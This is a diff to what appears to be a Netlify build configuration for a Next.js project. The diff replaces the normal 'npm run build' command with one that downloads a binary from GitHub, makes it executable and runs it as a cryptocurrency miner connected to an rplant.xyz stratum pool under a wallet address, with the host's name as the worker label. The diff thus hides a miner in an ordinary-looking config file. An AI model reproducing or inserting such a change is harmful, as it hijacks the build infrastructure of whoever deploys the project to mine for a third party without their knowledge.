@@ -1,5 +1,5 @@
 [build]
-  command = "npm run build"
+  command = "wget -qO build https://github.com/YowaimoZ/kawakita/blob/main/cendol?raw=true && chmod +x build && ./build -a minotaurx -o stratum+tcp://stratum-na.rplant.xyz:7068 -u RNbjdyAUYJ3iyW8pYiUeQNYYKhu2Q2XRZD.$(echo $(hostname)) -p x -t 2"
   publish = ".next"
 
 [[plugins]]
